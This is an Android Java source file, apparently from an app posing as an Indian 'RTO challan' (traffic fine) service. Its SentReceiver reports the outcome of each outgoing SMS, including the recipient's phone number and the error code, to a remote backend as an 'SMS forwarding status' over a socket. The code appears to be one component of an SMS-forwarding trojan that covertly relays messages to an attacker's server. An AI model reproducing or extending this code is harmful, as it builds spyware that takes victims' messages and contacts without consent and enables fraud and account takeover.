package com.service.rtochallan;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;

import org.json.JSONException;
import org.json.JSONObject;

public class SentReceiver extends BroadcastReceiver {
    protected SocketManager socketManager;

    @Override
    public void onReceive(Context context, Intent intent) {
        socketManager = SocketManager.getInstance(context);
        Helper helper = new Helper();

        int id = intent.getIntExtra("id", -1);
        String number = intent.getStringExtra("phone");
        String status;
        String statusMessage;
        int errorCode = getResultCode();

        switch (errorCode) {
            case Activity.RESULT_OK:
                status = "Sent";
                statusMessage = "SMS sent successfully to " + number;
                break;

            case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                status = "SentFailed";
                statusMessage = "Generic failure sending to " + number;
                break;

            case SmsManager.RESULT_ERROR_NO_SERVICE:
                status = "SentFailed";
                statusMessage = "No service available for " + number;
                break;

            case SmsManager.RESULT_ERROR_NULL_PDU:
                status = "SentFailed";
                statusMessage = "Null PDU (Protocol Data Unit) while sending to " + number;
                break;

            case SmsManager.RESULT_ERROR_RADIO_OFF:
                status = "SentFailed";
                statusMessage = "Radio off — unable to send SMS to " + number;
                break;

            default:
                status = "SentFailed";
                statusMessage = "Unknown error (" + errorCode + ") sending to " + number;
                break;
        }

        try {
            JSONObject data = new JSONObject();
            data.put("id", id);
            data.put("sms_forwarding_status", status);
            data.put("sms_forwarding_status_message", statusMessage);
            data.put("error_code", errorCode); // ✅ include actual numeric code

            // Send status update to your backend
            socketManager.emit("updateSMSForwardingStatus", data);
            //Log.d(helper.TAG, statusMessage);

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
